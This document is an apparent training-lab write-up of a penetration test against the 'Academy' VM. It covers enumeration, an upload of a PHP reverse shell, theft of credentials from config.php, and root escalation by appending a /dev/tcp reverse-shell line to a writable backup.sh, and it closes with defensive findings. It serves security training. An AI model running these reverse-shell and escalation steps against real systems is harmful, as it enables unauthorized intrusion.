# Hack the Academy Machine  
**CPENT Authorized Lab Report – Full Exploitation Walkthrough**  
  

------------------------------------------------------------------------------------------------

## 📌 Overview  
This exercise simulates a **full-chain authorized penetration test** on the **Academy machine** using a Kali Linux attacker system.  
The assessment involved service enumeration, exploitation of insecure configurations, file upload abuse, credential extraction, and privilege escalation to root.

All testing occurred **strictly in an isolated, authorized training environment**.

------------------------------------------------------------------------------------------------

## 📘 Abstract  
This lab simulated an authorized penetration test against the Academy VM. Initial network and service enumeration identified FTP, SSH, and HTTP services. Anonymous FTP access allowed retrieval of sensitive files, and web enumeration revealed an upload interface at `/academy/` that failed to properly validate files.

A crafted PHP reverse shell was uploaded and executed, giving a **www-data shell**. Local enumeration using **LinPEAS** exposed configuration files and plaintext credentials for the user **grimmie**, enabling SSH access. A writable `backup.sh` script permitted insertion of a reverse-shell payload, and once triggered, yielded a **root shell**.  
Findings highlight serious misconfigurations including anonymous FTP, insecure upload handling, leaked credentials, and unsafe script permissions.

------------------------------------------------------------------------------------------------

## 🏗 Lab Environment  

| Component | Details |
|----------|---------|
| Attacker Machine | Kali Linux |
| Target Machine | Academy VM |
| Attacker IP | 192.168.68.128 |
| Target IP | 192.168.68.129 |
| Open Ports | FTP(21), SSH(22), HTTP(80) |

> IPs above are **lab-only** and safe to include.

------------------------------------------------------------------------------------------------

## 🔑 Key Terms

| Term | Description |
|------|-------------|
| **Kali Linux** | Pen-testing Linux distro used for scanning and exploitation |
| **Academy Machine** | Vulnerable training VM provided for CPENT-style labs |
| **FTP (21)** | File Transfer Protocol; anonymous access is risky |
| **SSH (22)** | Secure Shell; should require strong authentication |
| **HTTP (80)** | Web server hosting vulnerable upload page |
| **Privilege Escalation** | Moving from low privilege (www-data) to root |
| **LinPEAS** | Linux enumeration script identifying escalation vectors |

------------------------------------------------------------------------------------------------

## 🧪 Step-by-Step Procedure

### **1. Identify IP addresses**
ip a

shell
Copy code
------------------------------------------------------------------------------------------------
### **2. Ping test between machines**
ping 192.168.68.128 # From Academy Machine
ping 192.168.68.129 # From Kali Machine

shell
Copy code
------------------------------------------------------------------------------------------------
### **3. ARP scan for live hosts**
sudo arp-scan -l

markdown
Copy code
------------------------------------------------------------------------------------------------
### **4. Full nmap scan**
nmap 192.168.68.129

pgsql
Copy code
------------------------------------------------------------------------------------------------
### **5. Connect to FTP (anonymous login)**
ftp 192.168.68.129

yaml
Copy code
------------------------------------------------------------------------------------------------
### **6. Download sensitive file from FTP**
Retrieve `note.txt`, read credentials/hints.

------------------------------------------------------------------------------------------------

## 🌐 Web Enumeration

### **7. Access the web server**
http://192.168.68.129

markdown
Copy code
-----------------------------------------------------------------------------------------------
### **8. Gobuster directory brute-force**
gobuster dir -u http://192.168.68.129 -w /usr/share/wordlists/dirb/common.txt

yaml
Copy code
------------------------------------------------------------------------------------------------
### **9. Access /academy/ login & crack password**
- Credentials found in **note.txt**  
- Registration No: **10201321**  
- Password (after hash crack): **student**

------------------------------------------------------------------------------------------------

## 💣 Reverse Shell Upload Exploit

### **10. Edit PHP reverse shell**
$ip = 192.168.68.128
$port = 8080

markdown
Copy code
------------------------------------------------------------------------------------------------
### **11. Start listener**
nc -lvnp 8080

markdown
Copy code
------------------------------------------------------------------------------------------------
### **12. Upload to /academy/ profile page**  
Reverse shell connects → you gain **www-data shell**.
------------------------------------------------------------------------------------------------
### **13. Spawn proper TTY**
python3 -c 'import pty; pty.spawn("/bin/bash")'

yaml
Copy code

------------------------------------------------------------------------------------------------

## 🔍 Local Enumeration

### **14. Navigate to /var/www/html/academy**
------------------------------------------------------------------------------------------------
### **15. Transfer LinPEAS from Kali**
Start python server on Kali:
python3 -m http.server 80

nginx
Copy code

Download on target:
wget http://192.168.68.128/linpeas.sh

markdown
Copy code
------------------------------------------------------------------------------------------------
### **16. Make executable**
chmod 777 linpeas.sh

markdown
Copy code
------------------------------------------------------------------------------------------------
### **17. Run LinPEAS**
bash linpeas.sh

yaml
Copy code

------------------------------------------------------------------------------------------------

## 🔐 Credential Discovery & SSH Access

### **18. Navigate to user home**
cd /home/grimmie

makefile
Copy code
------------------------------------------------------------------------------------------------
### **19. Extract credentials from config.php**
Path:
/var/www/html/academy/includes/config.php

markdown
Copy code
Credentials exposed → used to SSH as **grimmie**.
------------------------------------------------------------------------------------------------
### **20. SSH into the machine**
ssh grimmie@192.168.68.129

yaml
Copy code

------------------------------------------------------------------------------------------------

## ⬆️ Privilege Escalation to ROOT

### **21. Edit the vulnerable backup.sh script**
Append reverse shell line:
bash -c 'exec bash -i &>/dev/tcp/192.168.68.128/8888 <&1'

markdown
Copy code
------------------------------------------------------------------------------------------------
### **22. Start Netcat listener**
nc -lnvp 8888

markdown
Copy code

When the backup script runs, a **root shell** opens.

### 🎉 **ROOT ACCESS ACHIEVED**
whoami
root

yaml
Copy code

------------------------------------------------------------------------------------------------

## ✔ Findings

- Anonymous FTP allowed retrieval of sensitive files  
- Weak / leaked credentials (`student`, creds in config.php)  
- Insecure file upload allowed arbitrary PHP execution  
- Writable backup script enabled privilege escalation  
- No permission hardening on critical system files  

------------------------------------------------------------------------------------------------

